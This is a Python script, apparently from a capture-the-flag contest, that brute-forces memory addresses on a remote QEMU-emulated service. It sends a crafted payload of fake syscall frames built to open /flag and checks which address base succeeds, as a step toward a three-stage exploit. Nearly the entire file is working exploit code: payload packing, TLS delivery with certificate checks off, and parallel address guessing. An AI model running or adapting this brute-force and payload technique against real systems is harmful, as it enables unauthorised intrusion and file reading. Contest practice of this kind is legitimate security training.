#!/usr/bin/env python3
"""
Smart brute-force: test note bases for all known QEMU configs.
Tests exact addresses derived from local RESERVED_VA + STACK_SIZE combos.
"""
import socket, ssl, struct, time, concurrent.futures

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443
TRAP0 = 0x2ba08; RESTART = 0x21168; SYS_OPENAT = 56; AT_FDCWD = 0xFFFFFF9C

def build_note1(base):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, 0); struct.pack_into('<I', note, 8, 0)
    struct.pack_into('<I', note, 12, 0); struct.pack_into('<I', note, 16, 0)
    struct.pack_into('<I', note, 20, base + 32); struct.pack_into('<I', note, 24, AT_FDCWD)
    struct.pack_into('<I', note, 28, SYS_OPENAT)
    note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, base + 56); struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56); struct.pack_into('<I', note, 60, RESTART)
    return note

def test(base):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(6)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        ssock.connect((HOST, PORT))
        data = b''
        ssock.settimeout(3)
        while b'> ' not in data:
            try: data += ssock.recv(4096)
            except: break
        ssock.send(b'3\n' + bytes(build_note1(base)) + b'\n')
        data = b''
        ssock.settimeout(4)
        while True:
            try:
                chunk = ssock.recv(4096)
                if not chunk: break
                data += chunk
                if b'ROP Register Lab' in data:
                    ssock.close()
                    return (base, True)
            except: break
        ssock.close()
        return (base, False)
    except:
        return (base, False)

# Generate addresses from ALL known QEMU configurations
bases = []

# 1. Default (no env vars) - note at 0x4080e4c0, iovec at 0x4080e3f8
# The exact base depends on stack alignment; try all 0x10-aligned around it
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x4080e4c0 + off)

# 2. QEMU_STACK_SIZE set (any value) - note at 0x4020e4b0
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x4020e4b0 + off)

# 3. RESERVED_VA=0x40000000 - iovec ~0x15d6e3e8, note ~0x15d6e4c0
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x15d6e4c0 + off)

# 4. RESERVED_VA=0x20000000 - iovec ~0x0b2be3e8, note ~0x0b2be4c0
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x0b2be4c0 + off)

# 5. RESERVED_VA=0x10000000 - iovec ~0x05d6e3e8, note ~0x05d6e4c0
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x05d6e4c0 + off)

# 6. RESERVED_VA=0xC0000000 - iovec range
for off in range(-0x200, 0x200, 0x10):
    bases.append(0x60c0e4c0 + off)

# Dedup
unique = list(dict.fromkeys(bases))
print(f"[*] Testing {len(unique)} addresses across 6 configurations...")

found = None
# Parallel testing with 4 workers
for i in range(0, len(unique), 8):
    batch = unique[i:i+8]
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = {executor.submit(test, b): b for b in batch}
        for f in concurrent.futures.as_completed(futures):
            base, ok = f.result()
            if ok:
                print(f"\n*** FOUND! Remote note base = 0x{base:08x} ***")
                found = base
                break
    if found:
        break
    if i % 200 == 0:
        print(f"  [{i}/{len(unique)}]")

if found:
    print(f"\n[*] Remote base confirmed: 0x{found:08x}")
    print(f"[*] You can now run the full 3-stage exploit!")
else:
    print(f"\n[*] Base not found in tested range")
